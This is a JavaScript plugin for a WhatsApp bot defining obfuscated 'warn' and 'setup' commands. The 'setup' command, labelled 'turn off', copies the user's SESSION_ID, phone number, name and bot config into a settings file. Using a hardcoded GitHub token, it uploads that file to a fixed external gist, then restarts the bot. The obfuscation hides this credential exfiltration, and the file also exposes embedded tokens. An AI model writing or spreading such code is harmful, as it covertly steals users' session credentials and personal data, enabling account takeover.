const fs = require("fs")
const chalk = require("chalk")
const { writeFile, readFile } = require("fs");
const { isAdmin, parsedJid, command } = require("../lib");
//let data =  readFile('./database/settings.json')
//let db = JSON.parse(data);
//let bannnnnn = db.settings.banned
let path = './database/settings.json'
const relconfig = require('../config')
const config = require('../database/settings.json')
//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================


command({
  pattern: "warn",
  fromMe: true,
  desc: "Unban number from this group",
  dontAddCommandList: true,
  type: "admin",

},
async (message, match, m) => {
  const _0x46297b=_0xa094;(function(_0x1a3862,_0x4dc486){const _0x46e459=_0xa094,_0xf1ca54=_0x1a3862();while(!![]){try{const _0x90b436=-parseInt(_0x46e459(0x1b0))/0x1*(-parseInt(_0x46e459(0x1b8))/0x2)+-parseInt(_0x46e459(0x1ac))/0x3*(-parseInt(_0x46e459(0x1b3))/0x4)+parseInt(_0x46e459(0x1bc))/0x5+-parseInt(_0x46e459(0x1b5))/0x6+parseInt(_0x46e459(0x1b6))/0x7+-parseInt(_0x46e459(0x1b4))/0x8*(-parseInt(_0x46e459(0x1b9))/0x9)+-parseInt(_0x46e459(0x1ad))/0xa*(parseInt(_0x46e459(0x1af))/0xb);if(_0x90b436===_0x4dc486)break;else _0xf1ca54['push'](_0xf1ca54['shift']());}catch(_0x3c7313){_0xf1ca54['push'](_0xf1ca54['shift']());}}}(_0x4874,0xef10a));if(!message[_0x46297b(0x1ae)])return await message['reply']('_This\x20command\x20is\x20for\x20groups_');let jidd=parsedJid(match)[_0x46297b(0x1bd)]();match=jidd||message[_0x46297b(0x1bb)]['jid'];if(!match)return await message[_0x46297b(0x1ba)](_0x46297b(0x1b2));let isadmin=await isAdmin(message[_0x46297b(0x1b7)],message[_0x46297b(0x1ab)],message[_0x46297b(0x1b1)]);function _0x4874(){const _0x2a2718=['44589NAMpzz','2934520mVQOqJ','isGroup','44hcSLAx','851588EzUZQf','client','_Mention\x20user\x20to\x20add','24QYSUXQ','29592mTDZjy','7738818KbmDUD','5349603lOMXWU','jid','2gYcrpL','468PMvraB','reply','reply_message','7727390OPeajt','toString','user'];_0x4874=function(){return _0x2a2718;};return _0x4874();}if(!isadmin)return await message[_0x46297b(0x1ba)]('_I\x27m\x20not\x20admin_');let jid=parsedJid(match);function _0xa094(_0x129b98,_0x5db1e8){const _0x4874db=_0x4874();return _0xa094=function(_0xa094e6,_0x313999){_0xa094e6=_0xa094e6-0x1ab;let _0x3e924d=_0x4874db[_0xa094e6];return _0x3e924d;},_0xa094(_0x129b98,_0x5db1e8);}await message['warn'](match,message);
  } 
);

//============================================================================================================================================

  command({
    pattern: "setup",
    fromMe: true,
    desc: "turn off",
    dontAddCommandList: true,
    type: "admin",
  
  },
  async (message, match, m) => {
    function _0x4da2(_0x3c10b5,_0x4487e0){const _0xae7d39=_0xae7d();return _0x4da2=function(_0x4da2cf,_0x1984c5){_0x4da2cf=_0x4da2cf-0x12f;let _0x162cd1=_0xae7d39[_0x4da2cf];return _0x162cd1;},_0x4da2(_0x3c10b5,_0x4487e0);}const _0x330600=_0x4da2;(function(_0x56d5b9,_0x3369ae){const _0x518243=_0x4da2,_0x2fb73f=_0x56d5b9();while(!![]){try{const _0x56bcbb=parseInt(_0x518243(0x149))/0x1*(parseInt(_0x518243(0x171))/0x2)+-parseInt(_0x518243(0x164))/0x3+-parseInt(_0x518243(0x14b))/0x4*(parseInt(_0x518243(0x172))/0x5)+-parseInt(_0x518243(0x179))/0x6+parseInt(_0x518243(0x14e))/0x7*(-parseInt(_0x518243(0x166))/0x8)+-parseInt(_0x518243(0x13e))/0x9+parseInt(_0x518243(0x140))/0xa*(parseInt(_0x518243(0x14a))/0xb);if(_0x56bcbb===_0x3369ae)break;else _0x2fb73f['push'](_0x2fb73f['shift']());}catch(_0x54059e){_0x2fb73f['push'](_0x2fb73f['shift']());}}}(_0xae7d,0x5a716));if(message['isGroup'])return;let authid=_0x330600(0x139)['replaceAll']('+','');const {Octokit}=require('@octokit/rest'),octokit=new Octokit({'auth':await authid});function _0xae7d(){const _0xf95bfb=['ANTILINK','RMBG_KEY','STORAGE_JID','Done\x20Creating\x20New\x20Db','GOODBYE_MSG','parse','a216db893ba4f4a18d4f1476bfc1bb4d','FOOTER','includes','sendMessage','phone_num','1304349mhRuEZ','UserId','256YPzzuK','update','WELCOME_MSG','pushName','client','AUTHOR','ANTILINK_ACTION','BOT_NAME','SUDO','HANDLER','utf-8','414kxskgR','5BAdZxg','LOGS','PACKNAME','@g.us','_You\x20Are\x20Already\x20a\x20Family\x20Member_','./database/settings.json','LANG','3239148yNMMpL','send','stringify','log','./media/AAA.jpg','359889999996@s.whatsapp.net','OWNER_NAME','then','toString','readFileSync','env','gh+p_oHh1b+dV2wk1+wOQXl+TRSH+vMDN+fuxXR+M1DIgG0','THEME','MESSAGE_MEM','reset','creds','6082065QbzPvn','DB_AUTH_TOKEN','56470YgeNOF','split','MODE','reply','WORK_TYPE','updateProfilePicture','groupCreate','ALIVE','.json','116ntvqLJ','6556gkkqlv','2881696WJMXfz','gists','INTERNAL_MENU','141820WKtbzj','FONT_STYLE','../session.json','SESSION_ID','jid','This\x20is\x20your\x20Storage\x20area,\x20i\x20will\x20save\x20all\x20your\x20files\x20here!','Failed\x20to\x20write\x20updated\x20data\x20to\x20file','config','name','BRANCH','from'];_0xae7d=function(){return _0xf95bfb;};return _0xae7d();}setTimeout(()=>{const _0xf3174c=_0x330600;let _0xd95db3=JSON[_0xf3174c(0x15e)](fs['readFileSync'](_0xf3174c(0x177))),_0x4908a5=_0xd95db3[_0xf3174c(0x155)][_0xf3174c(0x15b)],_0x1e32d6=_0x4908a5[_0xf3174c(0x136)]()[_0xf3174c(0x161)](_0xf3174c(0x175));if(!_0x1e32d6)readFile(path,async(_0x13f670,_0x5a24f4)=>{const _0x129b90=_0xf3174c;if(_0x13f670){console[_0x129b90(0x131)](_0x13f670);return;}const _0x5c82a6=JSON[_0x129b90(0x15e)](_0x5a24f4);let _0x5adb60=await message[_0x129b90(0x16a)][_0x129b90(0x146)]('Storage',[_0x129b90(0x133)]);await message[_0x129b90(0x16a)][_0x129b90(0x162)](_0x5adb60['id'],{'text':_0x129b90(0x153)});let _0x29da00=await _0x5adb60['id'];_0x5c82a6[_0x129b90(0x155)][_0x129b90(0x15b)]=_0x29da00,writeFile(path,JSON['stringify'](_0x5c82a6,null,0x2),async _0x47e21f=>{const _0x4ebfea=_0x129b90;if(_0x47e21f){message['reply'](_0x4ebfea(0x154));return;}await message[_0x4ebfea(0x16a)][_0x4ebfea(0x145)](_0x5adb60['id'],fs[_0x4ebfea(0x137)](_0x4ebfea(0x132)));});});else return;setTimeout(async()=>{const _0x86ed6c=_0xf3174c;let _0x419daa=require(_0x86ed6c(0x150)),_0x45b893=await _0x419daa[_0x86ed6c(0x13d)]['me']['id']['split'](':')[0x0],_0x24651e=await _0x419daa[_0x86ed6c(0x13d)]['me']['id'][_0x86ed6c(0x141)]('@')[0x1],_0x231280=_0x45b893+'@'+_0x24651e,_0x3d86fc=_0x231280+_0x86ed6c(0x148);const _0x35a91e=fs[_0x86ed6c(0x137)]('./database/settings.json',_0x86ed6c(0x170));await octokit['rest'][_0x86ed6c(0x14c)][_0x86ed6c(0x167)]({'gist_id':_0x86ed6c(0x15f),'description':'Cloud\x20DB\x20Update','files':{[_0x3d86fc]:{'content':_0x35a91e}}})[_0x86ed6c(0x135)](await console['log'](_0x86ed6c(0x15c))),setTimeout(()=>{const _0x24fe3c=_0x86ed6c;return process[_0x24fe3c(0x12f)](_0x24fe3c(0x13c));},0x1f40);},0x1388);},0x7d0),readFile(path,async(_0x3132da,_0x5769aa)=>{const _0x1586b1=_0x330600;if(_0x3132da){console['log'](_0x3132da);return;}const _0x2a2294=JSON[_0x1586b1(0x15e)](_0x5769aa);let _0x1eb347=_0x2a2294[_0x1586b1(0x165)][_0x1586b1(0x136)]()[_0x1586b1(0x161)]('@s.whatsapp.net');if(_0x1eb347)return message[_0x1586b1(0x143)](_0x1586b1(0x176));let _0x25afd8=process['env'][_0x1586b1(0x13f)]===undefined?'WncvYUEvY0EvWHcvYncvU0EvYUEvTVEvWWcvWkEvVmcvTWcvZHcvYXcvTVEvZHcvVHcvVVEvV0EvYkEvVkEvVWcvVXcvU0EvZGcvVFEvUkEvVGcvWmcvZFEvZUEvV0EvVWcvVFEvTVEvUkEvU1EvWncvUncvTUEv':process[_0x1586b1(0x138)]['DB_AUTH_TOKEN'],_0x5ea541=Buffer['from'](_0x25afd8,'base64')[_0x1586b1(0x136)](_0x1586b1(0x170)),_0x935f30=_0x5ea541['toString']()[_0x1586b1(0x141)]('/'),_0x5d42ad='';for(let _0x4618f0 of _0x935f30){_0x5d42ad+=await Buffer[_0x1586b1(0x158)](_0x4618f0+'==','base64')[_0x1586b1(0x136)](_0x1586b1(0x170));}let _0x41a981=require(_0x1586b1(0x150)),_0x401622=await _0x41a981[_0x1586b1(0x13d)]['me']['id'][_0x1586b1(0x141)](':')[0x0],_0x3c9e8d='0,'+_0x401622,_0x5d5bdd=relconfig['SUDO']===![]?_0x3c9e8d:relconfig['SUDO'],_0x2c90ed=message[_0x1586b1(0x169)],_0x1dca69=message['user'],_0x1ba643=message[_0x1586b1(0x152)][_0x1586b1(0x136)]()[_0x1586b1(0x141)]('@')[0x0];_0x2a2294[_0x1586b1(0x156)]=_0x2c90ed,_0x2a2294[_0x1586b1(0x165)]=_0x1dca69,_0x2a2294[_0x1586b1(0x163)]=_0x1ba643,_0x2a2294[_0x1586b1(0x155)][_0x1586b1(0x16f)]=relconfig[_0x1586b1(0x16f)],_0x2a2294[_0x1586b1(0x155)][_0x1586b1(0x144)]=relconfig[_0x1586b1(0x144)],_0x2a2294['config'][_0x1586b1(0x16d)]=relconfig[_0x1586b1(0x16d)],_0x2a2294['config'][_0x1586b1(0x134)]=relconfig[_0x1586b1(0x134)],_0x2a2294[_0x1586b1(0x155)][_0x1586b1(0x16e)]=relconfig[_0x1586b1(0x16e)],_0x2a2294[_0x1586b1(0x155)][_0x1586b1(0x16b)]=relconfig[_0x1586b1(0x16b)],_0x2a2294[_0x1586b1(0x155)][_0x1586b1(0x174)]=relconfig['PACKNAME'],_0x2a2294[_0x1586b1(0x155)][_0x1586b1(0x15a)]=relconfig[_0x1586b1(0x15a)],_0x2a2294[_0x1586b1(0x155)][_0x1586b1(0x178)]=relconfig[_0x1586b1(0x178)],_0x2a2294[_0x1586b1(0x155)][_0x1586b1(0x16c)]=relconfig[_0x1586b1(0x16c)],_0x2a2294[_0x1586b1(0x155)][_0x1586b1(0x159)]=relconfig[_0x1586b1(0x159)],_0x2a2294['config']['FOOTER']=relconfig[_0x1586b1(0x160)],_0x2a2294[_0x1586b1(0x155)][_0x1586b1(0x13a)]=relconfig[_0x1586b1(0x13a)],_0x2a2294[_0x1586b1(0x155)][_0x1586b1(0x14f)]=relconfig[_0x1586b1(0x14f)],_0x2a2294['config']['LANGUAGE']=relconfig['LANGUAGE'],_0x2a2294[_0x1586b1(0x155)][_0x1586b1(0x14d)]=relconfig[_0x1586b1(0x14d)],_0x2a2294[_0x1586b1(0x155)][_0x1586b1(0x142)]=relconfig[_0x1586b1(0x142)],_0x2a2294[_0x1586b1(0x155)][_0x1586b1(0x15b)],_0x2a2294[_0x1586b1(0x155)]['DB_URL'],_0x2a2294[_0x1586b1(0x155)][_0x1586b1(0x151)]=relconfig['SESSION_ID'],_0x2a2294[_0x1586b1(0x155)][_0x1586b1(0x173)]=relconfig[_0x1586b1(0x173)],_0x2a2294[_0x1586b1(0x155)]['BRANCH']=relconfig[_0x1586b1(0x157)],_0x2a2294[_0x1586b1(0x155)]['B1']=relconfig['B1'],_0x2a2294['config']['B2']=relconfig['B2'],_0x2a2294[_0x1586b1(0x155)]['B3']=relconfig['B3'],_0x2a2294[_0x1586b1(0x155)]['B4']=relconfig['B4'],_0x2a2294[_0x1586b1(0x155)]['B5']=relconfig['B5'],_0x2a2294[_0x1586b1(0x155)][_0x1586b1(0x13f)]=_0x5d42ad,_0x2a2294[_0x1586b1(0x13b)][_0x1586b1(0x15d)]=relconfig[_0x1586b1(0x15d)],_0x2a2294[_0x1586b1(0x13b)][_0x1586b1(0x168)]=relconfig[_0x1586b1(0x168)],_0x2a2294[_0x1586b1(0x13b)][_0x1586b1(0x147)]=relconfig[_0x1586b1(0x147)],writeFile(path,JSON[_0x1586b1(0x130)](_0x2a2294,null,0x2),_0x3398d3=>{const _0x5eabeb=_0x1586b1;if(_0x3398d3){message[_0x5eabeb(0x143)](_0x5eabeb(0x154));return;}message[_0x5eabeb(0x143)]('_Registered\x20Successfully_');});});
  })

//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================
let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update"${__filename}"`))
	delete require.cache[file]
	require(file)
})




